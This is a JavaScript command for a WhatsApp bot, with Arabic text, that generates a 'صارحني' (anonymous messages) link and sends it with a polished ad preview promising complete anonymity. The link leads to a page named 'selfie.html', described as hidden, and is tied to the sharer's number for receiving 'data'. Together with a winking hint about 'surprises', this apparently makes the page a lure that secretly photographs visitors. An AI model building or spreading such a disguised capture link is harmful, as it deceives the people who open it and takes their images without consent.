const moment = require('moment-timezone');

module.exports = {
    name: 'صارحني',
    aliases: ['رسالة', 'صراحة'],
    category: 'إداري',
    description: 'توليد رابط صارحني الفخم لاستقبال الرسائل بسرية تامة',
    async execute({ sock, msg, args, reply, from, sender, sessionId }) {
        try {
            // استخراج رقم المرسل (لاستقبال البيانات عليه)
            const cleanSender = sender.split('@')[0];

            // جلب النطاق العام (دومين Render) أو السيرفر المحلي
            const serverBaseUrl = process.env.RENDER_EXTERNAL_URL || `http://localhost:${process.env.PORT || 10000}`;

            // بناء الرابط المباشر لصفحة الصارحني (selfie.html) المخبأة في public
            const sarahniUrl = `${serverBaseUrl}/selfie.html?session=${sessionId}&target=${cleanSender}`;

            // تنسيق الرسالة بفخامة واحترافية للواتساب
            const responseText = 
`╭════ 💌 ﴿ بَـوَّابَـةُ الـمُـصَـارَحَـة ﴾ 💌 ════╮
│
│ 👤 ╟ *الـجَـلْـسَـة:* ${sessionId}
│ 🕒 ╟ *الـتَّـوْقِـيـت:* ${moment().tz("Asia/Riyadh").format("YYYY-MM-DD | HH:mm")}
│
├══════════════════════════════┤
│
│ 🔗 ╟ *رَابِـطُ الاسْـتِـقْـبَـالِ الـخَـاصِّ بِـك:*
│ ${sarahniUrl}
│
╰══════════════════════════════╯

💡 *نَصِيحَة:* _انْسَخ هَذَا الرَّابِط، وَضَعْهُ فِي حَالَتِك أَوْ مِلَفِّكَ الشَّخْصِيِّ، وَاسْتَقْبِلْ رَسَائِلَ أَصْدِقَائِكَ (وَمُفَاجَآتِهِمْ) بِسِرِّيَّةٍ تَامَّةٍ 😉._`;

            // إرسال الرسالة مع معاينة (Ad Reply) جذابة جداً
            await sock.sendMessage(from, {
                text: responseText,
                contextInfo: {
                    externalAdReply: {
                        title: '💌 صارحني - رسائل سرية ومجهولة',
                        body: 'اكتب ما في قلبك بسرية تامة.. لن يعرف أحد هويتك!',
                        thumbnailUrl: 'https://cdn.pixabay.com/photo/2021/02/19/13/40/envelope-6030386_1280.png', // صورة ظرف رسالة وردي فخمة
                        sourceUrl: sarahniUrl,
                        mediaType: 1,
                        renderLargerThumbnail: true
                    }
                }
            }, { quoted: msg });

        } catch (error) {
            console.error('❌ خطأ في أمر صارحني:', error);
            reply('❌ حدث خطأ داخلي أثناء توليد رابط صارحني.');
        }
    }
};
